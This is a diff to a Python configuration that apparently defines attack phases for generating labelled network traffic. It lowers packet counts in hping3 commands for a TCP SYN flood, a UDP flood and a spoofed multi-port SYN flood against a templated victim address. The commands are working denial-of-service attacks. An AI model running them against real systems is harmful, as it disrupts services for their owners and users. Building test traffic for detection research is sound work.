@@ -99,10 +99,10 @@ ATTACK_PHASES = [
     },
     {
         "label": "DoSSYNFlood",
-        "description": "hping3 TCP SYN flood (capped at 500,000 packets)",
+        "description": "hping3 TCP SYN flood (capped at 20,000 packets)",
         "default_duration": 30,
         "auto_cmd": (
-            "sudo hping3 -S --flood -p 80 -c 500000 {victim_ip}"
+            "sudo hping3 -S --flood -p 80 -c 20000 {victim_ip}"
         ),
     },
     {
@@ -114,7 +114,7 @@ ATTACK_PHASES = [
         "description": "hping3 UDP flood targeting port 80",
         "default_duration": 30,
         "auto_cmd": (
-            "sudo hping3 --udp --flood -p 80 -c 500000 {victim_ip}"
+            "sudo hping3 --udp --flood -p 80 -c 20000 {victim_ip}"
         ),
     },
     {
@@ -127,9 +127,9 @@ ATTACK_PHASES = [
         "description": "hping3 multi-source spoofed SYN flood simulating DDoS",
         "default_duration": 30,
         "auto_cmd": (
-            "sudo hping3 -S --flood --rand-source -p 80 -c 200000 {victim_ip} & "
-            "sudo hping3 -S --flood --rand-source -p 443 -c 200000 {victim_ip} & "
-            "sudo hping3 -S --flood --rand-source -p 22 -c 100000 {victim_ip} & "
+            "sudo hping3 -S --flood --rand-source -p 80 -c 10000 {victim_ip} & "
+            "sudo hping3 -S --flood --rand-source -p 443 -c 10000 {victim_ip} & "
+            "sudo hping3 -S --flood --rand-source -p 22 -c 5000 {victim_ip} & "
             "wait"
         ),
     },
